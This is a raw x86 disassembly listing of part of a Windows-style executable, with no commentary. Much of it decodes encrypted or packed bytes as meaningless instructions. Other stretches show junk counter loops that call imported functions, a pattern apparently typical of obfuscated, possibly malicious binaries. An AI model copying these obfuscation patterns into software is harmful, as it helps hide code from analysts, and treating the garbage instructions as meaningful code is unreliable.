  40a257:	sub    eax,0xda967cfb
  40a25c:	and    BYTE PTR [edi+0x1076379b],al
  40a262:	cmp    al,BYTE PTR [ecx+ecx*8+0x69fdfae]
  40a269:	ficomp WORD PTR [ebx-0x5d]
  40a26c:	push   0x26
  40a26e:	mov    edi,esp
  40a270:	sub    BYTE PTR [ebx-0x3fcc7d9],cl
  40a276:	cli    
  40a277:	or     cl,BYTE PTR ds:0xb4e6b89a
  40a27d:	push   edx
  40a27e:	push   esi
  40a27f:	nop
  40a280:	je     0x40a299
  40a282:	inc    esp
  40a283:	aad    0xe7
  40a285:	fsubr  DWORD PTR [esi-0x595407e]
  40a28b:	jo     0x40a299
  40a28d:	xor    eax,0x9b68a070
  40a292:	xor    DWORD PTR [ecx],ebx
  40a294:	das    
  40a295:	test   al,0x3c
  40a297:	sub    esi,DWORD PTR [edx+0xed33c32]
  40a29d:	mov    ebx,0xf1f080c2
  40a2a2:	inc    eax
  40a2a3:	pop    esi
  40a2a4:	mov    DWORD PTR [edx-0x262a8430],ecx
  40a2aa:	js     0x40a297
  40a2ac:	mov    bh,0xd7
  40a2ae:	ds mov ecx,0x125cd56c
  40a2b4:	sub    DWORD PTR [edi+0x42],0x6900d677
  40a2bb:	jo     0x40a29c
  40a2bd:	adc    al,0xd1
  40a2bf:	int3   
  40a2c0:	(bad)  
  40a2c1:	pop    ds
  40a2c2:	lods   eax,DWORD PTR ds:[esi]
  40a2c3:	addr16 mov ah,0x98
  40a2c6:	(bad)  
  40a2c8:	std    
  40a2c9:	sub    DWORD PTR [eax],0xffffffb1
  40a2cc:	xchg   dl,bh
  40a2ce:	ror    BYTE PTR [esi-0x6af5569],0x88
  40a2d5:	or     bl,BYTE PTR [edi]
  40a2d7:	pop    edx
  40a2d8:	mov    ecx,0x3926676f
  40a2dd:	pop    esi
  40a2de:	push   esi
  40a2df:	div    DWORD PTR [esi-0x56ea74f1]
  40a2e5:	cmp    BYTE PTR [edx+0x1dc48279],dh
  40a2eb:	dec    edx
  40a2ec:	or     BYTE PTR [ecx-0x7a],cl
  40a2ef:	es jns 0x40a35b
  40a2f2:	sub    BYTE PTR [edx+0x3e],bl
  40a2f5:	and    eax,0x189135e4
  40a2fa:	pop    ebx
  40a2fb:	push   cs
  40a2fc:	ret    
  40a2fd:	call   0x6a3:0x114adfe4
  40a304:	xor    eax,0x4bae4275
  40a309:	cdq    
  40a30a:	imul   eax,DWORD PTR [edi+0x5f762eff],0xffffff89
  40a311:	pusha  
  40a312:	stos   BYTE PTR es:[edi],al
  40a313:	cs xchg ecx,eax
  40a315:	sbb    DWORD PTR [ebx-0x452a6e70],esp
  40a31b:	ret    0x7da6
  40a31e:	(bad)  
  40a31f:	xchg   esp,eax
  40a320:	test   DWORD PTR [edi+0x424739c],0xfa257e6c
  40a32a:	fwait
  40a32b:	pop    ebp
  40a32c:	push   ecx
  40a32d:	arpl   WORD PTR [ebx+0x2a],sp
  40a330:	fnstsw WORD PTR [edx+0xf45a0b2]
  40a336:	ret    0xa6af
  40a339:	sbb    al,0x78
  40a33b:	(bad)  
  40a33c:	fst    QWORD PTR [ebx]
  40a33e:	adc    eax,0x1c07c9fd
  40a343:	popa   
  40a344:	mov    ch,0x76
  40a346:	sub    DWORD PTR [esp+ecx*8],ebx
  40a349:	stos   DWORD PTR es:[edi],eax
  40a34a:	mov    ch,0x87
  40a34c:	jge    0x40a2d1
  40a34e:	mov    al,0x2c
  40a350:	push   edi
  40a351:	mov    ebp,0xb1d3064e
  40a356:	jmp    FWORD PTR [ebp+0x53]
  40a359:	xchg   edx,eax
  40a35a:	adc    al,0xe8
  40a35c:	mov    eax,ebx
  40a35e:	and    al,0x91
  40a360:	jmp    0xd96c4ad1
  40a365:	add    eax,0xd450ed14
  40a36a:	mov    ds:0x9b9aff3f,eax
  40a36f:	jg     0x40a3d8
  40a371:	mov    ebx,0x465fe82
  40a376:	mov    cl,0x3e
  40a378:	lea    ebx,[edi-0x17]
  40a37b:	dec    esp
  40a37c:	call   0xc170:0x9d01f87b
  40a383:	sti    
  40a384:	inc    ecx
  40a385:	xchg   esi,eax
  40a386:	sub    ecx,DWORD PTR [edx+0x29]
  40a389:	push   edi
  40a38a:	sub    ebx,eax
  40a38c:	clc    
  40a38d:	push   edi
  40a38e:	cmp    BYTE PTR ds:0x4e28,cl
  40a393:	test   DWORD PTR [edx],0x588d0071
  40a399:	bt     DWORD PTR [edi],ebp
  40a39c:	inc    ebp
  40a39d:	(bad)  
  40a39e:	ds inc ebx
  40a3a0:	push   ebx
  40a3a1:	mov    dh,0x7
  40a3a3:	adc    DWORD PTR [edi],0x1
  40a3a6:	pop    edi
  40a3a7:	ror    BYTE PTR ds:0xc7fff699,0x19
  40a3ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3af:	sti    
  40a3b0:	xor    al,0xa1
  40a3b2:	dec    eax
  40a3b3:	rcr    DWORD PTR [edi+0x7a],cl
  40a3b6:	into   
  40a3b7:	mov    esi,0xc606b168
  40a3bc:	stc    
  40a3bd:	cmp    esi,esi
  40a3bf:	jmp    0x40a413
  40a3c1:	push   esp
  40a3c2:	call   0xa01e:0x72decb2e
  40a3c9:	fwait
  40a3ca:	xchg   esi,eax
  40a3cb:	fnstcw WORD PTR [ecx]
  40a3cd:	(bad)  
  40a3cf:	mov    al,ds:0xf9cab72c
  40a3d4:	inc    eax
  40a3d5:	mov    bl,BYTE PTR ds:0x8480325e
  40a3db:	test   eax,0x245c18c
  40a3e0:	sub    eax,DWORD PTR [ebp+0x2e]
  40a3e3:	add    dl,0xd9
  40a3e6:	cmp    bh,BYTE PTR [esi+0x179e27b6]
  40a3ec:	leave  
  40a3ed:	mov    edx,0x4999feb0
  40a3f2:	rol    BYTE PTR ds:0x4eac8a30,1
  40a3f8:	call   0x9c85:0x3bd445c7
  40a3ff:	clc    
  40a400:	mov    DWORD PTR [ebp-0x30],0xf89c853a
  40a407:	or     edi,edi
  40a409:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40a410:	sbb    edi,DWORD PTR ds:0x434587
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x4344f3,0x13
  40a427:	cmp    DWORD PTR ds:0x4344f3,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x4344f3,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43460f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x4344f3
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x4344f3,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x4345fb,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x4345fb
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x4345fb,edx
  40a477:	cmp    DWORD PTR ds:0x4345fb,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x4345b7
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x4348a7
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x4345fb,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x43454b,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434593,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x434553,0x43454f
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x434577,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x434577,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434603,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x4345cb,0x43457b
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x43454f,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x43454f,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x4344f3,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x4344fb,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x4345fb,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434617
  40a564:	mov    edx,DWORD PTR ds:0x434627
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x43453f,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x43453f
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x43453f,ebx
  40a58c:	cmp    DWORD PTR ds:0x43453f,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x43453f,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x43453f
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x43453f,ebx
  40a5bc:	cmp    DWORD PTR ds:0x43453f,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x43457f
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x434537,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x43454b,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x43454b,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x43454b,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x43454b
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x43454b,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x4345c7,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x43453f,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x4345bf
  40a648:	add    DWORD PTR ds:0x434613,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x43457f,0x434607
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	pop    ds
  40a66d:	xchg   ecx,eax
  40a66e:	rcr    DWORD PTR [eax+0x7e7ef2fa],cl
  40a674:	jo     0x40a6ef
  40a676:	jle    0x40a6f6
  40a678:	(bad)  
  40a679:	add    BYTE PTR [bx+si],0x10
  40a67d:	ror    esi,1
  40a67f:	pop    edi
  40a680:	mov    edi,0x445d20d2
  40a685:	ror    DWORD PTR [ecx],0x17
  40a688:	or     al,0xe2
  40a68a:	jnp    0x40a652
  40a68c:	inc    edi
  40a68d:	mov    dh,BYTE PTR fs:[edi+ebx*4-0x762f74a5]
  40a695:	lea    ebp,[ebp-0x61]
  40a698:	cmp    dh,BYTE PTR [eax-0x5f49e381]
  40a69e:	jnp    0x40a71f
  40a6a0:	je     0x40a6a4
  40a6a2:	(bad)  
  40a6a3:	add    esi,DWORD PTR ss:[edi+0xa]
  40a6a7:	cmp    edx,0xffffffe9
  40a6aa:	and    ebx,DWORD PTR [edi-0x62e6f97a]
  40a6b0:	fsub   st(5),st
  40a6b2:	stc    
  40a6b3:	dec    esi
  40a6b4:	clc    
  40a6b5:	(bad)  
  40a6b6:	mov    bl,0x6d
  40a6b8:	cmc    
  40a6b9:	sub    BYTE PTR [esi-0x4ace0e75],ah
  40a6bf:	sub    eax,0xedf132c6
  40a6c4:	and    dh,bl
  40a6c6:	pop    esi
  40a6c7:	inc    eax
  40a6c8:	dec    ebx
  40a6c9:	std    
  40a6ca:	cld    
  40a6cb:	imul   DWORD PTR [edx-0x609625b]
  40a6d1:	pop    eax
  40a6d3:	gs or  esp,edx
  40a6d6:	or     DWORD PTR [eax+0x61b62fde],esp
  40a6dc:	mul    DWORD PTR [esi]
  40a6de:	push   ebp
  40a6e0:	jo     0x40a6a8
  40a6e2:	jb     0x40a74f
  40a6e4:	ss mov ah,0x7f
  40a6e7:	js     0x40a6bf
  40a6e9:	xor    BYTE PTR [edi+0x2397ee17],bl
  40a6ef:	pop    ds
  40a6f0:	mov    ds:0x84e1c74f,eax
  40a6f5:	nop
  40a6f6:	cmp    al,BYTE PTR [ecx]
  40a6f8:	cwde   
  40a6f9:	xor    eax,0xf743f559
  40a6fe:	push   ebp
  40a6ff:	inc    esi
  40a700:	or     ebx,DWORD PTR [ecx-0x77]
  40a703:	adc    BYTE PTR [edx+0x67d4de75],dh
  40a709:	push   ss
  40a70a:	and    eax,ebp
  40a70c:	cdq    
  40a70d:	aaa    
  40a70e:	scas   eax,DWORD PTR es:[edi]
  40a70f:	push   edx
  40a710:	pop    ds
  40a711:	xchg   ebx,eax
  40a712:	ins    DWORD PTR es:[edi],dx
  40a713:	pop    esp
  40a714:	jns    0x40a713
  40a716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a717:	mov    bl,0xee
  40a719:	stos   DWORD PTR es:[edi],eax
  40a71a:	mov    al,0xa5
  40a71c:	cmp    cl,BYTE PTR [eax+eax*8+0x7a60d913]
  40a723:	add    eax,0xb79a1e00
  40a728:	scas   al,BYTE PTR es:[edi]
  40a729:	push   0x10
  40a72b:	mov    ds:0xa0451d4,al
  40a730:	jb     0x40a6ed
  40a732:	fld    TBYTE PTR [edi-0x32]
  40a735:	je     0x40a790
  40a737:	inc    esp
  40a738:	pop    ecx
  40a739:	repnz shl BYTE PTR [edx+0x71c73fda],cl
  40a740:	push   eax
  40a741:	inc    esi
  40a742:	fwait
  40a743:	inc    esp
  40a744:	dec    eax
  40a745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a746:	std    
  40a747:	cmp    BYTE PTR [ecx],dh
  40a749:	enter  0xe2e9,0x11
  40a74d:	pusha  
  40a74e:	sbb    ah,BYTE PTR [esi-0x2839bba8]
  40a754:	call   0xece5:0x571e4099
  40a75b:	push   ebx
  40a75c:	sub    ah,ch
  40a75e:	add    al,BYTE PTR [ebp-0x434afee2]
  40a764:	pop    eax
  40a765:	mov    edx,0x246f52be
  40a76a:	scas   eax,DWORD PTR es:[edi]
  40a76b:	push   esp
  40a76c:	push   0x77f62160
  40a771:	adc    ch,BYTE PTR [edx-0x1276370e]
  40a777:	inc    esp
  40a778:	cld    
  40a779:	lahf   
  40a77a:	loopne 0x40a7c8
  40a77c:	xlat   BYTE PTR ds:[ebx]
  40a77d:	hlt    
  40a77e:	cmp    BYTE PTR [ecx-0xcb872f7],0x2a
  40a785:	rol    DWORD PTR [ecx-0x238503d5],cl
  40a78b:	mov    ebx,DWORD PTR [ecx]
  40a78d:	ret    
  40a78e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a78f:	add    eax,DWORD PTR [ebp-0xc925728]
  40a795:	(bad)  
  40a796:	ja     0x40a721
  40a798:	pop    ds
  40a799:	sbb    ecx,ebp
  40a79b:	mov    bl,cl
  40a79d:	shl    DWORD PTR [eax-0xf420d8f],0xec
  40a7a4:	sub    al,0x35
  40a7a6:	aam    0xc4
  40a7a8:	lahf   
  40a7a9:	inc    esi
  40a7aa:	jmp    0xe5f0ab5f
  40a7af:	shl    ebx,0xca
  40a7b2:	dec    edi
  40a7b3:	ds inc ebp
  40a7b5:	aam    0x10
  40a7b7:	xchg   BYTE PTR [esi-0x7e61d881],bh
  40a7bd:	fbstp  TBYTE PTR [ecx+0x56]
  40a7c0:	mov    dl,0x92
  40a7c2:	mov    bl,BYTE PTR [ebx+0x4]
  40a7c5:	jecxz  0x40a7e8
  40a7c7:	mov    esi,esp
  40a7c9:	gs push eax
  40a7cb:	(bad)  
  40a7cc:	sti    
  40a7cd:	div    edi
  40a7cf:	sbb    eax,0x835ae3c
  40a7d4:	mov    ds:0xaa20f78a,eax
  40a7d9:	xchg   ecx,eax
  40a7da:	fnsave [edx+0x1c]
  40a7dd:	fild   QWORD PTR [edx+0x655b1d21]
  40a7e3:	push   ebx
  40a7e4:	or     esp,DWORD PTR [edx]
  40a7e6:	minps  xmm2,XMMWORD PTR [edx+ebx*1+0x13]
  40a7eb:	pop    ss
  40a7ec:	stc    
  40a7ed:	jg     0x40a7c7
  40a7ef:	or     ebx,DWORD PTR [edx+0x4]
  40a7f2:	nop    ecx
  40a7f5:	xchg   ecx,eax
  40a7f6:	cmp    DWORD PTR [esi+ebp*8],edx
  40a7f9:	clc    
  40a7fa:	rol    DWORD PTR [eax+0x48],1
  40a7fd:	fisubr DWORD PTR [edi+0x9]
  40a800:	mov    edi,0x91fe80bd
  40a805:	cmp    bl,BYTE PTR [ebx]
  40a807:	dec    edi
  40a808:	inc    esp
  40a809:	cld    
  40a80a:	push   ecx
  40a80b:	pushf  
  40a80c:	fisub  WORD PTR [ecx]
  40a80e:	jle    0x40a850
  40a810:	jge    0x40a889
  40a812:	xor    DWORD PTR [ebp+0x41f6bf8f],esp
  40a818:	scas   al,BYTE PTR es:[edi]
  40a819:	sub    BYTE PTR [edx+eax*2-0x37152c5e],bl
  40a820:	xor    ecx,DWORD PTR [ebx]
  40a822:	push   esi
  40a823:	pop    edi
  40a824:	xchg   esi,eax
  40a825:	mov    dh,0x27
  40a827:	pusha  
  40a828:	shl    DWORD PTR [ecx+0x54],cl
  40a82b:	in     al,dx
  40a82c:	mov    edx,0x97b0258c
  40a831:	arpl   ax,sp
  40a833:	(bad)  
  40a834:	mov    eax,ds:0xb4a54c1
  40a839:	adc    ecx,DWORD PTR [ebp-0x5d638a28]
  40a83f:	mov    edi,ss
  40a841:	loope  0x40a8a3
  40a843:	cmc    
  40a844:	jns    0x40a81e
  40a846:	call   0x66668f23
  40a84b:	test   al,0xba
  40a84d:	stos   BYTE PTR es:[edi],al
  40a84e:	add    al,0x43
  40a850:	add    al,0xb1
  40a852:	fs repz (bad) 
  40a855:	mov    eax,0xd08a3d4b
  40a85a:	int3   
  40a85b:	out    dx,al
  40a85c:	or     eax,DWORD PTR [eax-0x1b6e0772]
  40a862:	aad    0x45
  40a864:	lock inc edx
  40a866:	xor    ch,BYTE PTR [ebp-0xfe804bb]
  40a86c:	inc    eax
  40a86d:	pop    ebp
  40a86e:	jmp    0x27be6fb6
  40a873:	in     al,dx
  40a874:	sub    esi,esi
  40a876:	scas   eax,DWORD PTR es:[edi]
  40a877:	cmp    ch,BYTE PTR [ecx+0x61dcf104]
  40a87d:	les    ecx,FWORD PTR [edi+0x8]
  40a880:	mov    ds:0x946e8d6,al
  40a885:	aaa    
  40a886:	enter  0xe244,0x4f
  40a88a:	loop   0x40a840
  40a88c:	scas   eax,DWORD PTR es:[edi]
  40a88d:	stc    
  40a88e:	push   ss
  40a88f:	icebp  
  40a890:	jno    0x40a892
  40a892:	mov    bh,0x23
  40a894:	imul   DWORD PTR [ecx+0x60bd4a6c]
  40a89a:	inc    edi
  40a89b:	mov    bl,0x43
  40a89d:	mov    al,ds:0xddbe749
  40a8a2:	mov    WORD PTR [ecx-0x67c5b5d],ds
  40a8a8:	pop    ss
  40a8a9:	mov    ebp,gs
  40a8ab:	inc    ecx
  40a8ac:	rol    BYTE PTR [esi+0x78],1
  40a8af:	popf   
  40a8b0:	jnp    0x40a8b7
  40a8b2:	jne    0x40a925
  40a8b4:	xchg   esi,eax
  40a8b5:	or     BYTE PTR [eax],0x7
  40a8b8:	pop    ebx
  40a8b9:	out    dx,eax
  40a8ba:	pop    ebp
  40a8bb:	orps   xmm1,XMMWORD PTR [edx]
  40a8be:	test   eax,0xc875da4e
  40a8c3:	ds enter 0x4db2,0x71
  40a8c8:	cdq    
  40a8c9:	mov    edx,0xd71456e1
  40a8ce:	sbb    BYTE PTR [ebp+ecx*1-0x6a3c4e14],dl
  40a8d5:	das    
  40a8d6:	adc    DWORD PTR [edx-0x7d36565],eax
  40a8dc:	jb     0x40a940
  40a8de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8df:	addr16 (bad) 
  40a8e2:	retf   
  40a8e3:	push   0xc16a70e2
  40a8e8:	dec    eax
  40a8e9:	call   0xfbc2:0x5ce1403
  40a8f0:	aad    0x3d
  40a8f2:	fsubrp st(5),st
  40a8f4:	popa   
  40a8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8f6:	inc    ecx
  40a8f7:	mov    al,ds:0xb3ed131c
  40a8fc:	jns    0x40a8ac
  40a8fe:	fisttp DWORD PTR [eax+0x53]
  40a901:	scas   eax,DWORD PTR es:[edi]
  40a902:	cmp    eax,0xfe5f4f96
  40a907:	xchg   esp,eax
  40a908:	ficomp WORD PTR [ebp+0xfa1cf66]
  40a90e:	fst    DWORD PTR [esi+0x2e6016ea]
  40a914:	add    BYTE PTR [ecx+edi*4-0xa55a2fe],0x7a
  40a91c:	dec    edx
  40a91d:	fiadd  DWORD PTR [ecx]
  40a91f:	mov    edx,0x5390cf0
  40a924:	data16 rcl ch,0xd2
  40a928:	lea    ebx,[eax-0x4b598917]
  40a92e:	push   0x134cec2f
  40a933:	jmp    0x35e1:0x5ae2a171
  40a93a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a93b:	out    0xb5,eax
  40a93d:	push   eax
  40a93e:	addr16 repz stc 
  40a941:	in     eax,dx
  40a942:	lahf   
  40a943:	inc    edx
  40a944:	mov    bh,BYTE PTR [ecx]
  40a946:	jg     0x40a9b1
  40a948:	not    BYTE PTR [ecx+eiz*1+0xadb6486]
  40a94f:	jae    0x40a8dd
  40a951:	cdq    
  40a952:	sbb    BYTE PTR [edx-0x3b],0x1
  40a956:	mov    esp,0x1eb9e12
  40a95b:	call   0x5833ef7
  40a960:	and    eax,0xf00e26dd
  40a965:	imul   ebx,DWORD PTR fs:[ebp+edx*4-0x3328ed91],0x4d
  40a96e:	adc    DWORD PTR [edx+0x4fac23e1],esp
  40a974:	push   ebx
  40a975:	sbb    ebx,eax
  40a977:	fnsave [eax+eax*2+0xe]
  40a97b:	loopne 0x40a915
  40a97d:	lahf   
  40a97e:	lods   eax,DWORD PTR ds:[esi]
  40a97f:	test   eax,0x3ae9c6f3
  40a984:	fsub   QWORD PTR [ebx-0x34]
  40a987:	lock mov ds:0x6c4ddadb,al
  40a98d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a98e:	cli    
  40a98f:	dec    edi
  40a990:	push   0xffffff80
  40a992:	rol    dh,1
  40a994:	cmc    
  40a995:	aaa    
  40a996:	add    DWORD PTR [ebp+0x63a872a],0xb36b2363
  40a9a0:	jl     0x40a923
  40a9a2:	push   edi
  40a9a3:	lock jle 0x40a988
  40a9a6:	fs clc 
  40a9a8:	xor    al,ah
  40a9aa:	sbb    bh,BYTE PTR [edx+0x2205f240]
  40a9b0:	sahf   
  40a9b1:	fisub  WORD PTR [ecx+0x4dc50e7f]
  40a9b7:	and    DWORD PTR [edx],edx
  40a9b9:	(bad)  
  40a9ba:	fild   QWORD PTR [edx+0x3f]
  40a9bd:	mov    bl,dl
  40a9bf:	cli    
  40a9c0:	xchg   ah,ah
  40a9c2:	ret    0xd181
  40a9c5:	ss mov ecx,0x3ca54aad
  40a9cb:	push   ebp
  40a9cc:	out    0x5c,al
  40a9ce:	shr    BYTE PTR [eax-0x48981803],cl
  40a9d4:	(bad)  
  40a9d5:	scas   al,BYTE PTR es:[edi]
  40a9d6:	test   al,0x5f
  40a9d8:	lods   eax,DWORD PTR ds:[esi]
  40a9d9:	mov    edx,0x2c7b29f8
  40a9de:	les    ebp,FWORD PTR [eax]
  40a9e0:	mov    al,ds:0x8d88b411
  40a9e5:	fsubr  QWORD PTR ds:0x5b58b06a
  40a9eb:	xchg   esi,eax
  40a9ec:	xlat   BYTE PTR ds:[ebx]
  40a9ed:	push   ebp
  40a9ee:	mov    cl,0x39
  40a9f0:	jmp    0x40aa0e
  40a9f2:	fdivr  DWORD PTR [esi]
  40a9f4:	inc    edx
  40a9f5:	ror    BYTE PTR [edi],1
  40a9f7:	imul   eax,DWORD PTR [eax],0xf
  40a9fa:	fmul   st,st(1)
  40a9fc:	sub    eax,0xfc6dbc3
  40aa01:	and    BYTE PTR [edx],ah
  40aa03:	fild   QWORD PTR [esi]
  40aa05:	sbb    BYTE PTR ds:0x5b7c5ac0,ah
  40aa0b:	inc    DWORD PTR [edi-0x20]
  40aa0e:	xor    bl,BYTE PTR [eax-0x79ade617]
  40aa14:	scas   eax,DWORD PTR es:[edi]
  40aa15:	in     al,dx
  40aa16:	jmp    0x1d9c:0x513e0db
  40aa1d:	jb     0x40a9d2
  40aa1f:	popf   
  40aa20:	push   cs
  40aa21:	sub    ch,ah
  40aa23:	add    DWORD PTR [edi],eax
  40aa25:	aad    0x6f
  40aa27:	test   al,0x8a
  40aa29:	sub    eax,0xa1220e76
  40aa2e:	adc    dh,ch
  40aa30:	lds    esp,FWORD PTR [edx+0x4e]
  40aa33:	shl    DWORD PTR [ecx-0x514c962b],1
  40aa39:	push   ebx
  40aa3a:	sub    DWORD PTR [eax-0x52588131],ebp
  40aa40:	fldenv [esi+0x20]
  40aa43:	(bad)  [ebx]
  40aa45:	pop    eax
  40aa46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa47:	pop    ebp
  40aa48:	mov    edx,0xb9db65b5
  40aa4d:	mov    cl,0x44
  40aa4f:	fistp  QWORD PTR [ecx-0x5b9b3a01]
  40aa55:	enter  0x4b58,0xc0
  40aa59:	std    
  40aa5a:	ja     0x40aa08
  40aa5c:	adc    al,BYTE PTR gs:[esi-0x4f7db8bf]
  40aa63:	push   esi
  40aa64:	bound  ecx,QWORD PTR ds:0x3ab06f93
  40aa6a:	or     al,BYTE PTR [ecx-0x644d7e1a]
  40aa70:	push   cs
  40aa71:	pop    esp
  40aa72:	xor    edx,eax
  40aa74:	adc    DWORD PTR ds:0x434553,0x43457f
  40aa7e:	add    edx,ecx
  40aa80:	jmp    0x40c4f6
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x4344f3,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x4345fb
  40aa9b:	sub    ebx,DWORD PTR ds:0x43460b
  40aaa1:	mov    DWORD PTR ds:0x4345fb,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x4345bb
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	pop    es
  40aacb:	pop    edi
  40aacc:	cmp    bh,dh
  40aace:	cld    
  40aacf:	(bad)  
  40aad0:	jle    0x40ab50
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	hlt    
  40aad7:	pop    es
  40aad8:	jge    0x40aa9d
  40aada:	imul   esi,esp,0xffffffe6
  40aadd:	nop
  40aade:	ds inc edx
  40aae0:	dec    edi
  40aae1:	sub    eax,0xab1b4dfd
  40aae6:	mov    esp,0xecf6c23c
  40aaeb:	sub    DWORD PTR [edi+0x77],edi
  40aaee:	sub    eax,0x55fd3334
  40aaf3:	(bad)  
  40aaf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaf5:	mov    ah,BYTE PTR [edi-0x324d8bec]
  40aafb:	addr16 dec ecx
  40aafd:	mov    bh,0x46
  40aaff:	cdq    
  40ab00:	shr    BYTE PTR [eax+esi*4-0x6b],1
  40ab04:	inc    esp
  40ab05:	into   
  40ab06:	jge    0x40ab01
  40ab08:	nop
  40ab09:	jb     0x40ab73
  40ab0b:	push   0x755a46ac
  40ab10:	test   al,0xee
  40ab12:	mov    ds,WORD PTR [ecx-0x3a]
  40ab15:	out    0x39,al
  40ab17:	mov    edi,0xb54d53e9
  40ab1c:	mov    ecx,0x9e89f877
  40ab21:	mov    bl,0x8a
  40ab23:	stos   BYTE PTR es:[edi],al
  40ab24:	aas    
  40ab25:	loop   0x40ab3b
  40ab27:	pop    ds
  40ab28:	adc    bh,ah
  40ab2a:	xchg   ebp,eax
  40ab2b:	jbe    0x40ab8d
  40ab2d:	ja     0x40ab46
